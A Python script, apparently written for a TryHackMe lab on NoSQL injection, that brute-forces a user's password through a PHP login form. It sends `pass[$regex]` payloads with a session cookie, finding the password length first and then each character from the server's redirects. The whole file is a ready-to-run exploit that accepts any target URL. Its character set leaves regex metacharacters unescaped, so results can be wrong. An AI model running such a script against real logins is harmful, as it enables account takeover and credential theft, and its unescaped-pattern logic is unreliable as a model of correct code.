# script with assistance from ChatGPT
# python script.py -url http://10.10.126.24 -max 10 -u john -session 8sgbbd25ak5tvmmc0f99mae3s
# used on TryHackMe room NoSQL Injection https://tryhackme.com/r/room/nosqlinjectiontutorial
# youtube video walk through: https://youtu.be/4TJlREKMZMk

import requests
import argparse
import string

def find_password_length(base_url, user, session_cookie, max_length):
    for length in range(max_length, 0, -1):
        payload = f"user={user}&pass[$regex]=^.{{{length}}}$&remember=on"
        response = send_request(base_url, payload, session_cookie)
        
        if "Location" in response.headers and response.headers["Location"] != "/?err=1":
            return length
    return None

def find_password_char(base_url, user, known_password, position, password_length, session_cookie):
    # Include additional special characters
    special_chars = "#$%&()*+,-./:;<=>?@[]^_`{|}~"
    char_set = string.ascii_letters + string.digits + special_chars
    
    for char in char_set:
        test_password = known_password + char + '.' * (password_length - len(known_password) - 1)
        payload = f"user={user}&pass[$regex]=^{test_password}$&remember=on"
        response = send_request(base_url, payload, session_cookie)
        
        if "Location" in response.headers and response.headers["Location"] != "/?err=1":
            return char
    return None

def send_request(base_url, payload, session_cookie):
    headers = {
        "Host": base_url.split('//')[1],
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base_url,
        "Connection": "close",
        "Referer": base_url,
        "Cookie": f"PHPSESSID={session_cookie}",
        "Upgrade-Insecure-Requests": "1"
    }

    response = requests.post(f"{base_url}/login.php", headers=headers, data=payload, allow_redirects=False)
    return response

def main():
    parser = argparse.ArgumentParser(description="NoSQL Injection Script to find password length and characters.")
    parser.add_argument("-url", required=True, help="Target URL")
    parser.add_argument("-max", type=int, default=10, help="Maximum password length to check")
    parser.add_argument("-u", required=True, help="Username")
    parser.add_argument("-session", required=True, help="PHP session ID")
    
    args = parser.parse_args()

    base_url = args.url
    user = args.u
    max_length = args.max
    session_cookie = args.session

    # Step 1: Find the password length
    password_length = find_password_length(base_url, user, session_cookie, max_length)
    if not password_length:
        print("Failed to determine password length")
        return

    print(f"Password length found: {password_length}")

    # Step 2: Find the password characters
    known_password = ""
    for position in range(password_length):
        char = find_password_char(base_url, user, known_password, position, password_length, session_cookie)
        if not char:
            print("Failed to determine password character")
            return
        
        known_password += char
        print(f"Found so far: {known_password}")

    print(f"Full password: {known_password}")

if __name__ == "__main__":
    main()
